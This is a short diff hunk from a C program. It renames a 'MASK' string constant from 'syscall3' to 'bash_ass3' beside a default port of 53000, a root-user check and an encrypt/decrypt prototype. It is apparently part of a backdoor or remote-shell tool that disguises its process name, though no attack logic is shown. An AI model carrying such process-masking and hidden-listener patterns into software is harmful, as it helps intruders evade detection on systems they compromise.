@@ -49,7 +49,7 @@
 #define DEFAULT_PORT 53000
 #define TRUE 1
 #define FALSE 0
-#define MASK "syscall3"
+#define MASK "bash_ass3"
 
 void check_root_user(void);
 char encrypt_decrypt(char input);
